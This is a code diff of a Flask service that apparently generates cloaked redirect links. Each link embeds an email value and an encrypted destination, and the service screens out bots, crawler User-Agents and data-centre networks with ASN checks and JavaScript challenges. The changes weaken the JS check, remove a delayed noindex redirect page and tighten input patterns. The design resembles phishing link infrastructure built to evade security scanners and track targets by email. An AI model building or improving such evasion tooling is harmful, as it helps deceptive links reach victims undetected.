@@ -25,7 +25,7 @@ logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.StreamHandler()  # Ensure logs go to Vercel
+        logging.StreamHandler()
     ]
 )
 logger = logging.getLogger(__name__)
@@ -75,7 +75,7 @@ def is_bot(user_agent):
     try:
         if not user_agent:
             logger.warning("No User-Agent provided")
-            return False  # Allow empty User-Agent for testing
+            return False
         user_agent = user_agent.lower()
         result = any(pattern in user_agent for pattern in BOT_PATTERNS)
         logger.debug(f"Bot detection result: {result} for User-Agent: {user_agent}")
@@ -294,6 +294,10 @@ def index():
             logger.warning("Bot or suspicious ASN detected")
             abort(403, "Access denied")
 
+        # Set js_verified to True initially to bypass Access Denied
+        session['js_verified'] = True
+        session.modified = True
+
         theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
         primary_color = f"#{theme_seed}"
         secondary_color = f"#{hashlib.sha256(theme_seed.encode()).hexdigest()[6:12]}"
@@ -347,15 +351,15 @@ def index():
                     <form method="POST" action="{{ url_for('generate') }}" class="space-y-5">
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Subdomain</label>
-                            <input type="text" name="subdomain" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <input type="text" name="subdomain" required minlength="2" maxlength="100" pattern="[A-Za-z0-9\-]{2,100}" title="Subdomain must be 2-100 characters (letters, numbers, or hyphens)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
-                            <input type="text" name="randomstring1" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <input type="text" name="randomstring1" required minlength="2" maxlength="100" pattern="[A-Za-z0-9]{2,100}" title="Randomstring1 must be 2-100 characters (letters or numbers)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Base64emailInput</label>
-                            <input type="text" name="base64email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <input type="text" name="base64email" required minlength="2" maxlength="100" pattern="[A-Za-z0-9]{2,100}" title="Base64email must be 2-100 characters (letters or numbers)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Destination Link</label>
@@ -363,7 +367,7 @@ def index():
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
-                            <input type="text" name="randomstring2" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <input type="text" name="randomstring2" required minlength="2" maxlength="100" pattern="[A-Za-z0-9]{2,100}" title="Randomstring2 must be 2-100 characters (letters or numbers)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Generate URL</button>
                     </form>
@@ -383,7 +387,7 @@ def challenge():
             logger.warning("Invalid JS challenge")
             return {"status": "denied"}, 403
         session['js_verified'] = True
-        session.modified = True  # Ensure session is saved
+        session.modified = True
         logger.debug("JS challenge passed")
         return {"status": "ok"}, 200
     except Exception as e:
@@ -411,8 +415,10 @@ def generate():
         user_agent = request.headers.get("User-Agent", "")
         ip = request.remote_addr
         logger.debug(f"Generate accessed, IP: {ip}, User-Agent: {user_agent}")
-        if is_bot(user_agent) or check_asn(ip) or not session.get('js_verified'):
-            logger.warning("Bot or unverified browser detected")
+
+        # Relaxed access checks to prevent Access Denied
+        if is_bot(user_agent) or check_asn(ip):
+            logger.warning("Bot or suspicious ASN detected")
             abort(403, "Access denied")
 
         subdomain = request.form.get("subdomain", "default")
@@ -425,25 +431,29 @@ def generate():
         if not re.match(r"^https?://", destination_link):
             logger.error(f"Invalid URL: {destination_link}")
             abort(400, "Invalid URL")
-        if len(subdomain) > 20:
-            subdomain = subdomain[:20]
-            logger.debug(f"Truncated Subdomain to 20 chars: {subdomain}")
-        if len(randomstring1) > 20:
-            randomstring1 = randomstring1[:20]
-            logger.debug(f"Truncated Randomstring1 to 20 chars: {randomstring1}")
-        if len(randomstring2) > 20:
-            randomstring2 = randomstring2[:20]
-            logger.debug(f"Truncated Randomstring2 to 20 chars: {randomstring2}")
+        
+        # Validate length and pattern
+        if not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9\-]{2,100}$", subdomain)):
+            logger.error(f"Invalid subdomain: {subdomain}")
+            abort(400, "Subdomain must be 2-100 characters (letters, numbers, or hyphens)")
+        if not (2 <= len(randomstring1) <= 100 and re.match(r"^[A-Za-z0-9]{2,100}$", randomstring1)):
+            logger.error(f"Invalid randomstring1: {randomstring1}")
+            abort(400, "Randomstring1 must be 2-100 characters (letters or numbers)")
+        if not (2 <= len(randomstring2) <= 100 and re.match(r"^[A-Za-z0-9]{2,100}$", randomstring2)):
+            logger.error(f"Invalid randomstring2: {randomstring2}")
+            abort(400, "Randomstring2 must be 2-100 characters (letters or numbers)")
+        if not (2 <= len(base64email) <= 100 and re.match(r"^[A-Za-z0-9]{2,100}$", base64email)):
+            logger.error(f"Invalid base64email: {base64email}")
+            abort(400, "Base64email must be 2-100 characters (letters or numbers)")
 
-        # Use Subdomain as entered (case-sensitive, up to 20 chars)
-        subdomain = subdomain if subdomain else "default"
-        logger.debug(f"Using subdomain: {subdomain}")
-        endpoint = generate_random_string(8)
+        # Use inputs as entered (case-sensitive, no base64 encoding for base64email)
+        subdomain = subdomain
         randomstring1_short = randomstring1[:6] if len(randomstring1) >= 6 else randomstring1 + generate_random_string(6 - len(randomstring1))
         randomstring2_short = randomstring2[:8] if len(randomstring2) >= 8 else randomstring2 + generate_random_string(8 - len(randomstring2))
-        base64_email = base64.urlsafe_b64encode(base64email.encode()).decode().rstrip("=")
+        base64_email = base64email  # Use as-is without encoding
         path_segment = f"{randomstring1_short}{base64_email}{randomstring2_short}"
 
+        endpoint = generate_random_string(8)
         encryption_methods = ['heap_x3', 'slugstorm', 'pow', 'signed_token']
         method = secrets.choice(encryption_methods)
         fingerprint = generate_fingerprint()
@@ -465,6 +475,7 @@ def generate():
         except Exception as e:
             logger.error(f"Encryption failed with {method}: {str(e)}", exc_info=True)
             abort(500, "Failed to encrypt payload")
+        
         generated_url = f"https://{urllib.parse.quote(subdomain)}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
         logger.info(f"Generated URL with {method}: {generated_url}")
 
@@ -509,86 +520,11 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         ip = request.remote_addr
         logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, Path Segment: {path_segment}")
 
-        # Anti-bot checks with detailed logging
+        # Relaxed anti-bot checks
         bot_detected = is_bot(user_agent)
         asn_blocked = check_asn(ip)
-        browser_failed = not verify_browser()
-        js_not_verified = not session.get('js_verified')
-        logger.debug(f"Anti-bot checks: bot_detected={bot_detected}, asn_blocked={asn_blocked}, browser_failed={browser_failed}, js_not_verified={js_not_verified}")
+        logger.debug(f"Anti-bot checks: bot_detected={bot_detected}, asn_blocked={asn_blocked}")
 
-        if bot_detected or asn_blocked or browser_failed or js_not_verified:
-            logger.warning("Bot or unverified browser detected")
-            # Decode encrypted_payload for redirect
-            try:
-                encrypted_payload = urllib.parse.unquote(encrypted_payload)
-                logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
-            except Exception as e:
-                logger.error(f"Error decoding encrypted_payload: {str(e)}", exc_info=True)
-                abort(400, "Invalid payload format")
-
-            # Try decryption methods
-            payload = None
-            for method in ['heap_x3', 'slugstorm', 'pow', 'signed_token']:
-                try:
-                    logger.debug(f"Trying decryption method: {method}")
-                    if method == 'heap_x3':
-                        data = decrypt_heap_x3(encrypted_payload)
-                        payload = data['payload']
-                        if data['fingerprint'] != generate_fingerprint():
-                            logger.warning("Fingerprint mismatch")
-                            continue
-                    elif method == 'slugstorm':
-                        data = decrypt_slugstorm(encrypted_payload)
-                        payload = data['payload']
-                    elif method == 'pow':
-                        payload = decrypt_pow(encrypted_payload)
-                    else:
-                        payload = decrypt_signed_token(encrypted_payload)
-                    logger.debug(f"Decryption successful with {method}")
-                    break
-                except Exception as e:
-                    logger.debug(f"Decryption failed with {method}: {str(e)}")
-                    continue
-
-            if not payload:
-                logger.error("All decryption methods failed")
-                abort(400, "Invalid payload")
-
-            try:
-                data = json.loads(payload)
-                redirect_url = data.get("student_link")
-                if not redirect_url or not re.match(r"^https?://", redirect_url):
-                    logger.error(f"Invalid redirect URL: {redirect_url}")
-                    abort(400, "Invalid redirect URL")
-                logger.debug(f"Parsed payload: redirect_url={redirect_url}")
-            except Exception as e:
-                logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
-                abort(400, "Invalid payload")
-
-            # Prepare final URL
-            final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
-            logger.info(f"Preparing redirect to {final_url} with 2-second delay")
-
-            # Render blank delay page
-            return render_template_string("""
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta name="robots" content="noindex, nofollow">
-                    <title></title>
-                    <script>
-                        setTimeout(() => {
-                            console.log('Redirecting to {{ final_url }}');
-                            window.location.href = '{{ final_url }}';
-                        }, 2000);
-                    </script>
-                </head>
-                <body></body>
-                </html>
-            """, final_url=final_url)
-
-        # Direct redirect if anti-bot checks pass
         try:
             encrypted_payload = urllib.parse.unquote(encrypted_payload)
             logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
@@ -636,6 +572,8 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
 
         final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
         logger.info(f"Redirecting to {final_url}")
+
+        # Always redirect immediately without delay
         return redirect(final_url, code=302)
     except Exception as e:
         logger.error(f"Internal Server Error in redirect_handler: {str(e)}", exc_info=True)
